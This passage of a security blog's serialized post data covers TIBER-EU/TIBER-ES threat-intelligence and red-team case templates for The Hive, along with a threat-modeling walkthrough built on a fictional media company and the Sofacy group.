url=\\"http://thehive:9000/cases/\\">\\r\\n\\r\\n<Tabs>\\r\\n  <TabItem value=\\"Testing Plan\\" label=\\"Testing Plan\\" default>\\r\\n\\r\\n**Case name:** Red Team Testing (RT) #1 - Red team testing plan\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Definition of the scope</li>\\r\\n<li>Task #2 - Meet with the threat intelligence team</li>\\r\\n<li>Task #3 - Make a risk plan</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/red_team_provider/Case-Template__Red_Team_Testing_RT_1_Red_team_testing_plan.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n\\r\\n  <TabItem value=\\"Testing methodology and scenarios\\" label=\\"Testing methodology and scenarios\\">\\r\\n\\r\\n**Case name:** Red Team Testing (RT) #2 - Testing methodology and scenarios\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Request for Information</li>\\r\\n<li>Task #2 - Reconnaissance</li>\\r\\n<li>Task #3 - Weaponization </li>\\r\\n<li>Task #4 - Delivery </li>\\r\\n<li>Task #5 - Exploitation </li>\\r\\n<li>Task #6 - Installation </li>\\r\\n<li>Task #7 - C2 </li>\\r\\n<li>Task #8 - Actions on Objectives</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/red_team_provider/Case-Template__Red_Team_Testing_RT_2_Testing_methodology_and_scenarios.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n  <TabItem value=\\"Execution of the test\\" label=\\"Execution of the test\\">\\r\\n\\r\\n**Case name:** Red Team Testing (RT) #3 - Execution of the test\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Execution </li>\\r\\n<li>Task #2 - During the execution</li>\\r\\n<li>Task #3 - After the execution</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"hhttps://github.com/jstnk9/TIBER-Cases/blob/main/cases/red_team_provider/Case-Template__Red_Team_Testing_RT_3_Execution_of_the_test.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n</Tabs>\\r\\n\\r\\n</BrowserWindow>\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/\\r\\n\\r\\n**GitHub Project**: https://github.com/jstnk9/TIBER-Cases"},{"id":"TIBER-EU-ES-Threat-Intelligence-Series-01","metadata":{"permalink":"/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01","source":"@site/blog/2022-02-10-TIBER-EUES-Threat-Intelligence-Series-01/2022-02-10-TIBER-EUES-Threat-Intelligence-Series-01.md","title":"TIBER-EU and TIBER-ES - Threat Intelligence (I)","description":"TL;DR","date":"2022-02-10T00:00:00.000Z","formattedDate":"February 10, 2022","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"risk","permalink":"/jstnk9/blog/tags/risk"},{"label":"threat modeling","permalink":"/jstnk9/blog/tags/threat-modeling"},{"label":"financial services","permalink":"/jstnk9/blog/tags/financial-services"},{"label":"tiber-eu","permalink":"/jstnk9/blog/tags/tiber-eu"},{"label":"tiber-es","permalink":"/jstnk9/blog/tags/tiber-es"}],"readingTime":10.31,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"TIBER-EU and TIBER-ES - Red Team","permalink":"/jstnk9/blog/TIBER-EU-ES-Red-Team-Series-01"},"nextItem":{"title":"Threat modeling and strategic vision of risks","permalink":"/jstnk9/blog/Threat-modeling-and-strategic-vision-of-risks"}},"content":"## TL;DR\\r\\n\\r\\nAfter the Bank of Spain (BDE) published the TIBER-ES guide adapted to the national territory in January 2022, I was thinking about the complexity that in some cases it would entail for Threat Intelligence and Red Team providers to give this service to financial entities.\\r\\n\\r\\nFor this reason, I wanted to carry out a development so that the Threat Intelligence teams speed up their work through predefined cases of the famous platform used in the world of CTI called **[The Hive](https://thehive-project.org/)**.\\r\\n\\r\\nThe developed cases contemplate all the phases that TIBER-EU mentions in its documentation, in addition I have also included good practices and ways of facing some phases.\\r\\n\\r\\nThe fact of using The Hive is due to the following reasons:\\r\\n- Allows to merge cases\\r\\n- Can be integrated with MISP\\r\\n- Can be integrated with Cortex and its analyzers\\r\\n- Case templates can be created\\r\\n\\r\\n**GitHub project**: https://github.com/jstnk9/TIBER-Cases\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Abbreviations\\r\\n\\r\\n| Key | Description |\\r\\n| ------ | ----------- |\\r\\n| Entity   | The term Entity during this blog and The Hive cases, refers to the entity that is going to carry out the TIBER-EU exercises. |\\r\\n| TI   | Threat Intelligence Provider. Is the provider of threat intelligence services for the Entity. |\\r\\n| RT | Red Team Provider. Is the provider of red teaming services for the Entity. |\\r\\n| WT    | White Team. Team responsible of the scope and operative execution of the exercises. |\\r\\n| BT    | Blue Team. Team without  knowledge about the exercise which have to respond to the attacks by the RT. |\\r\\n\\r\\n## Context\\r\\n\\r\\nDuring this blog I will not go into detail about what TIBER-EU or TIBER-ES is. I will simply mention that TIBER-EU is a European framework for testing red teaming with a threat intelligence approach. This approach is related to Lockheed Martin\'s well-known Intelligence Driven Defense\xae method.\\r\\n\\r\\nThe offensive tests will be from the perspective of actual attacks with procedures used by actors targeting the financial sector. For more information, I recommend reading the TIBER-EU and TIBER-ES guides.\\r\\n\\r\\n:::info\\r\\n\\r\\n**TIBER-EU Information: https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html**\\r\\n\\r\\n**TIBER-ES Information: https://www.bde.es/bde/es/secciones/servicios/tiber-es-3f6bfe7e907ed71.html**\\r\\n\\r\\n:::\\r\\n\\r\\n## Goal of this project and blog\\r\\n\\r\\nThe main objective of this project is to **help TI analysts** during the testing phase (testing phase is the name given by TIBER). To do this, different cases are made available that can be imported into The Hive and thus be able to speed up the work.\\r\\n\\r\\nFor this, a total of 6 cases have been developed, which have sub-tasks assigned to different types of threat intelligence analysts (tactical, operational and strategic levels).\\r\\n\\r\\nThe phases of the red team and blue team will not be covered during this blog and neither in the cases of The Hive. In future posts I make, I will generate new cases for those teams.\\r\\n\\r\\nFinally, in the phases and steps that come in this blog, it will not go into excessive detail about what needs to be done, since, in the cases that I have developed for The Hive, I put the necessary information for the threat intelligence analysts.\\r\\n\\r\\n## Process\\r\\n\\r\\nThe process that TIBER-EU makes available to the community is very interesting. The following image shows the activities carried out by the TI team within the testing phase.\\r\\n\\r\\n![tiberIntel_process](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tiber_intelligence.png)\\r\\n\\r\\nsource: ecb.europa.eu \\r\\n\\r\\n\\r\\nTo simplify the entire TIBER-EU document and the Threat Intelligence section a bit, I wanted to make a process explaining the most important points of the framework for those analysts who are going to work on it. Specifically, I have focused on the \\"Processes/Activities Threat Intelligence\\" section of the official TIBER-EU process.\\r\\n\\r\\n![jstnk_tiber](https://jstnk9.github.io/jstnk9/img/blog-tiber01/jstnk_tiber.png)\\r\\n\\r\\n### Generic Threat Landscape (GTL Report)\\r\\n\\r\\n\\r\\n![GTL](https://jstnk9.github.io/jstnk9/img/blog-tiber01/gtl_drk.png#gh-dark-mode-only)![jsis](https://jstnk9.github.io/jstnk9/img/blog-tiber01/gtl_wht.png#gh-light-mode-only)\\r\\n\\r\\nBefore starting, it should be made clear that the objective of the GTL Report is, as its name indicates, to generate a **generic** report about the financial landscape.\\r\\n\\r\\nThat said, we must start by knowing our adversaries, for this, we will have to access different sources of information, if possible about threats from the financial sector. Some resources that we can use in order to know these financial threats may be the following.\\r\\n\\r\\n- Reports developed by Cybersecurity Companies\\r\\n- Reports developed by FS-ISAC\\r\\n- Reports developed by Government Agencies\\r\\n\\r\\nDepending on the country to which the `Entity` belongs and/or operates, we must focus on threats from the financial sector, with geopolitical considerations of the country and possible criminal groups that carry out operations against said sector (it is important not to focus only in APTs).\\r\\n\\r\\nWith this information, it is recommended to generate a generic report on the adversaries identified as potential.\\r\\n\\r\\nIn the event that resources or time are not available to carry out this report, it is advisable to use public reports on past intrusions against the financial sector. The GTL report is optional, it is not mandatory, however, TIBER-EU recommends doing it :-).\\r\\n\\r\\n### Targeted Threat Intelligence (TTI Report)\\r\\n\\r\\n![TTI](https://jstnk9.github.io/jstnk9/img/blog-tiber01/TTI_drk.png#gh-dark-mode-only)![jsis](https://jstnk9.github.io/jstnk9/img/blog-tiber01/TTI_wht.png#gh-light-mode-only)\\r\\n\\r\\n\\r\\nDuring the TTI phase, the clear objectives that the TI team has to achieve are summarized below.\\r\\n1. Contextualize the information from the GTL Report to the `Entity`. This is achieved by identifying critical functions of the `Entity` with its help\\r\\n2. Share intelligence between the TI teams of the `Entity` and the TI Provider\\r\\n3. Focus the analysis efforts on two key points (Target and Threat) that will be described in the following points\\r\\n4. Create flags for the RT to get during his offensive tests. These flags must be contextualized with the information obtained from the `Entity`\\r\\n5. Create scenarios as real as possible about attacks that could occur in the `Entity`. These scenarios must be mapped to the kill chain to make each objective in each phase clear to the RT.\\r\\n6. Finally, a complete report will be generated with all the information. This report will be the entry point for the RT.\\r\\n\\r\\n<h3>Step 1 - Context </h3>\\r\\n\\r\\n![step1](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step1_drk.png#gh-dark-mode-only)![jsis](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step1_wht.png#gh-light-mode-only)\\r\\n\\r\\nThe first step, as mentioned above, aims to contextualize the GTL report on the `Entity`. During this step, we will have to exchange information (as a list of assets, departments, services, etc.) with the `Entity`, this will help us to understand more how your business works and possible assets considered as critical.\\r\\n\\r\\nIf possible, it is also highly recommended to ask the entity for reports on recent intrusions that they may have suffered. That information may later lead to possible scenarios.\\r\\n\\r\\nAsk yourself a question. How can you defend something if you don\'t know it? It is very important to know the `Entity\'s` business\\r\\n\\r\\n<h3>Step 2 - Sharing Intelligence</h3>\\r\\n\\r\\n![step2](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step2_drk.png#gh-dark-mode-only)![jsis](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step2_wht.png#gh-light-mode-only)\\r\\n\\r\\n\\r\\nThe second step is entirely focused on sharing intelligence between the two TI teams. This sharing can be done through structured formats supported by technology (see STIX, MISP, etc...) as in PDF formats or any other on reports made by the TI team of the `Entity`.\\r\\n\\r\\nWithin this activity, it has more value if the `Entity` shares intelligence generated by itself than that which it has consumed from third parties.\\r\\n\\r\\n<h3>Step 3 - Analysis</h3>\\r\\n\\r\\n![step3](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step3_drk.png#gh-dark-mode-only)![jsis](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step3_wht.png#gh-light-mode-only)\\r\\n\\r\\nThis is the most important step and in which you should invest more time. The analyzes should be separated into two key aspects.\\r\\n\\r\\n1. **Target**: It is based on understanding the exposure of the `Entity` from the point of view of an actor. Identify processes, people and potential technology to be targeted.\\r\\n\\r\\n2. **Threat**: We will have to map the motivations, objectives and TTPs of the adversaries with the interests of the `Entity`. For this, a [Threat Modeling](https://jstnk9.github.io/jstnk9/blog/Threat-modeling-and-strategic-vision-of-risks) will also have to be carried out to help us with this evaluation. The use of MITRE in this section is very important.\\r\\n\\r\\nMake sure the information captured from Threat maps to Target. Just an example, imagine that the `Entity` hasn\'t Windows Servers, then...\\r\\n\\r\\n:::tip Think about this.. Minimize your efforts\\r\\n\\r\\n**Why do you map procedures against Windows Server if the `Entity` doesn\'t have?**\\r\\n\\r\\n:::\\r\\n\\r\\nIt doesn\'t make sense for you to simulate adversarial sharing scenarios against Windows Server if it\'s never going to have an impact on the `Entity`.\\r\\n\\r\\n<h3> Step 4 - Flags</h3>\\r\\n\\r\\n![step4](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step4_drk.png#gh-dark-mode-only)![jsis](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step4_wht.png#gh-light-mode-only)\\r\\n\\r\\nSetting flags for the RT to get is challenging. The flags must be realistic, from the point of view that an actor could also get said flag. All those flags must be contextualized with the `Entity`. They can range from targeting a specific person to open an email to exploiting an exposed service known to have vulnerabilities.\\r\\n\\r\\n<h3> Step 5 - Create Scenarios</h3>\\r\\n\\r\\n![step5](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step5_drk.png#gh-dark-mode-only)![jsis](https://jstnk9.github.io/jstnk9/img/blog-tiber01/step5_wht.png#gh-light-mode-only)\\r\\n\\r\\nThe last step is related to creating scenarios for the RT to execute and get those previously set flags. Think that these scenarios can be carried out by real opponents. It is important to spell out at a very low level what you want the RT to do.\\r\\n\\r\\nThe procedures must be described in full detail, for example, if you want the RT to execute a command with a specific parameter, it must be indicated like this.\\r\\n\\r\\nFinally, all the scenarios that are developed must be mapped to the phases of the kill chain, which have a specific task in the case generated for this step.\\r\\n\\r\\n## The Hive\\r\\n\\r\\n### Import Case\\r\\n\\r\\nVersion of The Hive used:\\r\\n```yaml\\r\\nScalligraph: 0.1.0-SNAPSHOT\\r\\nTheHive: 4.1.18-1\\r\\nPlay: 2.8.7\\r\\n```\\r\\n\\r\\nBefore you begin, I highly recommend following the guide below to import the ATT&CK MITRE Matrix and MISP taxonomies into The Hive. To do this, go to the following links.\\r\\n\\r\\n:::info\\r\\n\\r\\nImport ATT&CK MITRE: https://docs.thehive-project.org/thehive/user-guides/administrators/tactics-techniques-procedures/\\r\\n\\r\\nImport MISP Taxonomies: https://docs.thehive-project.org/thehive/user-guides/administrators/tags-and-taxonomies/\\r\\n\\r\\n:::\\r\\n\\r\\nTo import the cases, you must have permissions to perform this task. To do this, you must first navigate to the `Organization` section that is located at the top next to the search bar.\\r\\n\\r\\n![step1](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial1.png)\\r\\n\\r\\nOnce inside that section, we will have to go to the section that says `Import template` and select the JSON files that are in my GitHub, specifically in the `cases` folder.\\r\\n\\r\\n![step2](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial2.png)\\r\\n\\r\\nOnce this is done, and when we click on the upper part where it says `+ New Case`, all the imported cases will appear with the information about the TIBER-EU phases.\\r\\n\\r\\n![step3](https://jstnk9.github.io/jstnk9/img/blog-tiber01/tutorial3.png)\\r\\n\\r\\n### Case visualization\\r\\n\\r\\nAs an example, once the cases are imported and one is generated to start working on it, they look like the following image:\\r\\n\\r\\n![gtl_case](https://jstnk9.github.io/jstnk9/img/blog-tiber01/gtl_case01.png)\\r\\n\\r\\nAs can be seen, it contains all the information the analyst needs to start working. The way cases are written is by using `markdown`.\\r\\n\\r\\nWhen clicking on `tasks`, the user can see the following information.\\r\\n\\r\\n![gtl_case_tasks](https://jstnk9.github.io/jstnk9/img/blog-tiber01/gtl_case03.png)\\r\\n\\r\\nAll the Tasks that are included in each case have `dependencies` and `goals`, this will help the analysts not lose focus and focus on the goals to be achieved.\\r\\n\\r\\n### Cases information\\r\\n\\r\\nHere you can find basic information about the created cases. Case name is the name defined for each case. Each case has different tasks to complete. You\'ll find all the information in the json files.\\r\\n\\r\\nimport Tabs from \'@theme/Tabs\';\\r\\nimport TabItem from \'@theme/TabItem\';\\r\\nimport BrowserWindow from \'@site/src/components/BrowserWindow\';\\r\\n\\r\\n<BrowserWindow url=\\"http://thehive:9000/cases/\\">\\r\\n\\r\\n<Tabs>\\r\\n  <TabItem value=\\"GTL\\" label=\\"GTL\\" default>\\r\\n\\r\\n**Case name:** Generic Threat Landscape (GTL)\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Source Collection</li>\\r\\n<li>Task #2 - Focus criteria</li>\\r\\n<li>Task #3 - GTL Report</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/threat_intelligence_provider/Case-Template__Generic_Threat_Landscape_GTL.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n\\r\\n  <TabItem value=\\"TTI - Step 1\\" label=\\"TTI - Step 1\\">\\r\\n\\r\\n**Case name:** Targeted Threat Intelligence (TTI) #1 - Context\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Request for Information</li>\\r\\n<li>Task #2 - Mapping context to threats</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/threat_intelligence_provider/Case-Template__Targeted_Threat_Intelligence_TTI_1_Context.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n  <TabItem value=\\"TTI - Step 2\\" label=\\"TTI - Step 2\\">\\r\\n\\r\\n**Case name:** Targeted Threat Intelligence (TTI) #2 - Sharing Intelligence\\r\\n\\r\\n**Tasks:**\\r\\n<li>Task #1 - Sharing Intelligence</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/threat_intelligence_provider/Case-Template__Targeted_Threat_Intelligence_TTI_2_Sharing_Intelligence.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n  <TabItem value=\\"TTI - Step 3\\" label=\\"TTI - Step 3\\">\\r\\n\\r\\n**Case name:** Targeted Threat Intelligence (TTI) #3 - Analysis\\r\\n\\r\\n**Tasks:** \\r\\n<li>Task #1 - Target</li>\\r\\n<li>Task #2 - Threat</li>\\r\\n<li>Task #3 - Threat Modeling</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/threat_intelligence_provider/Case-Template__Targeted_Threat_Intelligence_TTI_3_Analysis.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n  <TabItem value=\\"TTI - Step 4\\" label=\\"TTI - Step 4\\">\\r\\n\\r\\n**Case name:** Targeted Threat Intelligence (TTI) #4 - Flags\\r\\n\\r\\n**Tasks:** \\r\\n<li>Task #1 - Flags</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/threat_intelligence_provider/Case-Template__Targeted_Threat_Intelligence_TTI_4_Flags.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n  <TabItem value=\\"TTI - Step 5\\" label=\\"TTI - Step 5\\">\\r\\n\\r\\n**Case name:** Targeted Threat Intelligence (TTI) #5 - Scenarios\\r\\n\\r\\n**Tasks:** \\r\\n<li>Task #1 - Create Scenarios </li>\\r\\n<li>Task #2 - Reconnaissance</li>\\r\\n<li>Task #3 - Weaponization </li>\\r\\n<li>Task #4 - Delivery </li>\\r\\n<li>Task #5 - Exploitation </li>\\r\\n<li>Task #6 - Installation </li>\\r\\n<li>Task #7 - C2 </li>\\r\\n<li>Task #8 - Actions on Objectives</li><br></br>\\r\\n\\r\\n:mag_right: <a href=\\"https://github.com/jstnk9/TIBER-Cases/blob/main/cases/threat_intelligence_provider/Case-Template__Targeted_Threat_Intelligence_TTI_5_Scenarios.json\\" target=\\"_blank\\"> JSON File </a>\\r\\n\\r\\n  </TabItem>\\r\\n</Tabs>\\r\\n\\r\\n</BrowserWindow>\\r\\n\\r\\n\\r\\n<h2> Contact </h2>\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/\\r\\n\\r\\n**GitHub Project**: https://github.com/jstnk9/TIBER-Cases"},{"id":"Threat-modeling-and-strategic-vision-of-risks","metadata":{"permalink":"/jstnk9/blog/Threat-modeling-and-strategic-vision-of-risks","source":"@site/blog/2022-01-27-Threat-modeling-and-strategic-vision-of-risks/2022-01-27-Threat-modeling-and-strategic-vision-of-risks.md","title":"Threat modeling and strategic vision of risks","description":"TL;DR","date":"2022-01-27T00:00:00.000Z","formattedDate":"January 27, 2022","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"risk","permalink":"/jstnk9/blog/tags/risk"},{"label":"threat modeling","permalink":"/jstnk9/blog/tags/threat-modeling"}],"readingTime":8.015,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"TIBER-EU and TIBER-ES - Threat Intelligence (I)","permalink":"/jstnk9/blog/TIBER-EU-ES-Threat-Intelligence-Series-01"},"nextItem":{"title":"Indicator life cycle applied to threat hunting","permalink":"/jstnk9/blog/Indicator-life-cycle-applied-to-threat-hunting"}},"content":"## TL;DR\\r\\n\\r\\nThanks to threat modeling, a strategic view of the main threats can be given in order to focus prioritization efforts on those points where the greatest risk may exist.\\r\\n\\r\\nFrom a Cyber Threat Intelligence vision, the focus is on the identification of actors and events along with the TTPs and Tradecraft used in them, thus relating it to the activity of our organization.\\r\\n\\r\\nThe model has an advantage in that it can be as flexible as we want, which helps to adapt to our intelligence needs.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Goal\\r\\n\\r\\nThe main objective of threat modeling is to know the information and/or assets that are considered critical for the organization\'s business, after which it can be related to potential threats that could carry out an attack to achieve their final objectives.\\r\\n\\r\\nHaving clear the above, the first thing is to know that information or assets that we think are important for the organization. To achieve this, we could ask ourselves the following question:\\r\\n\\r\\n> What information and/or critical assets for the organization do I have to be the target of an attack?\\r\\n\\r\\nTo be able to answer this question well, we must put ourselves from the point of view of a malicious actor whose objective is our organization. Of course, the answer to this question will vary **depending on the sector to which our organization belongs and the activities it carries out**, since if we were a bank, one of the clear objectives of a malicious actor would be to access information related to transactions however, if our organization is a critical infrastructure, one of the objectives could be to access and control the HMIs.\\r\\n\\r\\nOnce we know the objective that would motivate a malicious actor to attack us, it is time to make a model for our organization.\\r\\n\\r\\n## Building the model\\r\\n\\r\\nBefore starting to work on our model, it is important to mention that it is advisable to update it periodically, either because the organization introduces new critical information or because there are new threats and different capabilities (there may also be threats that stop impacting organizations). organization operations).\\r\\n\\r\\nThe first thing that has to be done, as mentioned in the previous point, is to **identify the information or assets that are critical for the organization**. In this example, our company will be called ACME and its activity will be related to the media sector.\\r\\n\\r\\n![Image_1](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_1.png)\\r\\n\\r\\n### First level - Our assets\\r\\n\\r\\nIt is time to ask ourselves the question of the previous point.\\r\\n\\r\\n> What information and/or critical assets for the organization do I have to be the target of an attack?\\r\\n\\r\\nBearing in mind that ACME organization is related to media sector, three critical points of the organization that may be susceptible to attacks will be listed below:\\r\\n\\r\\n* **Intellectual property** of ACME on a generated good.\\r\\n\\r\\n* **TV Production**, thus referring to the production network where the direct television shows are found.\\r\\n\\r\\n* **Future premieres** that are agreed upon but are not public at the moment.\\r\\n\\r\\nHere is where we can add information obtained through the PPT methodology (People, process and technology)\\r\\n\\r\\n![Image_2](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_2.png)\\r\\n\\r\\nIn the first instance and being the most important, it has been possible to identify what the organization considers critical. In many cases, to obtain this information, interaction with different departments will be required and recommended to evaluate what they believe may seem important for the services and operation of the organization.\\r\\n\\r\\n### Second level - Motivations and objectives\\r\\n\\r\\nAt this point and within the three blocks that have been defined in the model, one might think what types of threats would apply to this case due to their motivations and objectives. It is very important to place special emphasis on the **objectives** and **motivations**, since not all threats seek the same thing.\\r\\n\\r\\nFor the block of new premieres, an actor with industrial espionage motivations or espionage in general could be valid, whose objective is to find out about new television series premieres on the network. Would it be possible for an actor to deploy capabilities to spy on the ACME organization? Probably yes.\\r\\n\\r\\nFor the intellectual property block, an actor with espionage motivations could also be worth it, but in this case, instead of wanting to know new releases, their objective could be to exfiltrate intellectual property information to the public or sell it and obtain economic benefits.\\r\\n\\r\\nFinally, for the TV production block, there could be a hacktivist motivation that has some kind of protest as its objective. These types of activities, in general, can leave without service or show personalized messages on the channels that are broadcast live on television.\\r\\n\\r\\nOnce the possible motivations that could exist for what has been defined as critical have been defined, it can be incorporated into the model and related.\\r\\n\\r\\n![Image_3](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_3.png)\\r\\n\\r\\n### Third level - Searching actors\\r\\n\\r\\nThe next step that must be taken so that the tree continues to take shape is to relate those threats that have been introduced at a high level, such as \\"hacktivists\\" and \\"actors with espionage motivation\\" at a lower level, giving them names and surnames.\\r\\n\\r\\nIn this part, Cyber Threat Intelligence analysts come into play, who with their knowledge of the threat landscape that exists today together with their work tools, will be able to relate all those actors who carry out campaigns with these motivations.\\r\\n\\r\\nTo continue, there are two paths, being able to take one of the two, or even both, they are the following.\\r\\n\\r\\n\\r\\n1. Match high-level threats to APTs/Non-APT Groups that have the motivations and activities described above.\\r\\n2. Relate high-level threats to actors who have been involved in past **internal incidents**. (This point should not be ignored, since the intelligence generated internally with past incidents can provide a better understanding of the threats that directly impact our organization)\\r\\n\\r\\n![Image_4](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_4.png)\\r\\n\\r\\nAs can be seen, and as an example so that it can serve as a reference, three different APTs have been added that have had the Media sector as their objective and that, in addition, one of their motivations has been espionage, having as a higher level intellectual property and future releases.\\r\\n\\r\\nOn the other hand, we have those threats linked to hacktivist activities, where it has been related to a group that has carried out attacks against our organization, specifically incidents number 45 and 51, for further reference.\\r\\n\\r\\nThe model grows in the form of a tree by itself and in a very agile way, helping to have an idea with just a glance of everything that could be a risk for the organization, and all this, with a down-to-earth context that is deals with critical information handled by ACME.\\r\\n\\r\\nThe model can grow as much as we want to make it grow. For example, at the point where it is, we could add those tools that the different actors have used to carry out their attacks. In this way, attack simulations could be carried out with the same tools to see the detection capabilities of the corresponding team that identifies and investigates this type of event.\\r\\n\\r\\n### Fourth level - Events and capabilities\\r\\n\\r\\nIt is true that if we have a large number of actors it could become a very large and unmanageable model, which is why at this point the figure of the CISO takes on a fundamental role, where he has to **prioritize intelligence requirement**s by focusing on one actor or two **in the first place**, in this way progressive progress is achieved until the objective of minimizing the risks as much as possible is achieved. Suppose that in this case, there is a request to obtain information about the APT Sofacy.\\r\\n\\r\\n![Image_5](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_5.png)\\r\\n\\r\\nIn this case, three blocks of capabilities used by the Sofacy APT are added (of course, all of them would have to be added). With a view to a better simulation of activity, it is interesting to add LOLBINS (Living Off The Land Binaries and Scripts) used in their campaigns so as not to be limited only to those tools that they have developed by themselves or taken advantage of code from others.\\r\\n\\r\\nAlso, as can be seen, there is a related event where an attack was carried out on the French-language international television channel TV5Monde. This attack can give us context of the motivations and objectives that the group had at a strategic level and provide us with information such as TTPs and Tradecraft at an operational level.\\r\\n\\r\\n![Image_6](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_6.png)\\r\\nSource: bbc.com\\r\\n\\r\\n### Fifth level - MITRE ATT&CK (Tactics and techniques)\\r\\n\\r\\nOf course, as mentioned a little above, the model could continue to grow if necessary. Imagining that there is a tactical intelligence requirement to carry out operations as real as possible by a red team, it is requested to add the tactics and techniques of one of the capabilities that Sofacy executes, leaving the model as shown below.\\r\\n\\r\\n![Image_7](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_7.png)\\r\\n\\r\\n### Sixth level - Procedures\\r\\n\\r\\nFinally, just for add more information to the model and make it actionable for the defenders, we can also add procedures of each technique used by the actors. This information can help us for make purple teaming exercises  in the future.\\r\\n\\r\\n![Image_8](https://jstnk9.github.io/jstnk9/img/blog-threat-modeling/threat-modeling_8.png)\\r\\n\\r\\nEverything seen so far will be carried out according to the needs of each organization. In general, no two models are the same, even from two organizations in the same sector, since what may be critical for one may not be for the other.\\r\\n\\r\\nIf the objective is to be proactive in the face of threats that may affect the interests of an organization, threat modeling can help **minimize risks** and **prioritize what is truly important.**\\r\\n\\r\\n**Twitter**: https://twitter.com/Joseliyo_Jstnk\\r\\n\\r\\n**LinkedIn**: https://www.linkedin.com/in/joseluissm/"},{"id":"Indicator-life-cycle-applied-to-threat-hunting","metadata":{"permalink":"/jstnk9/blog/Indicator-life-cycle-applied-to-threat-hunting","source":"@site/blog/2021-04-12-Indicator-life-cycle-applied-to-threat-hunting/2021-04-12-Indicator-life-cycle-applied-to-threat-hunting.md","title":"Indicator life cycle applied to threat hunting","description":"TL;DR","date":"2021-04-12T00:00:00.000Z","formattedDate":"April 12, 2021","tags":[{"label":"threat intelligence","permalink":"/jstnk9/blog/tags/threat-intelligence"},{"label":"threat huting","permalink":"/jstnk9/blog/tags/threat-huting"},{"label":"cybersecurity","permalink":"/jstnk9/blog/tags/cybersecurity"},{"label":"process","permalink":"/jstnk9/blog/tags/process"},{"label":"life-cycle","permalink":"/jstnk9/blog/tags/life-cycle"}],"readingTime":8.87,"truncated":true,"authors":[{"name":"Jose Luis S\xe1nchez Mart\xednez","title":"Security Researcher","url":"https://twitter.com/Joseliyo_Jstnk","imageURL":"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg","key":"joseliyo"}],"prevItem":{"title":"Threat modeling and strategic vision of 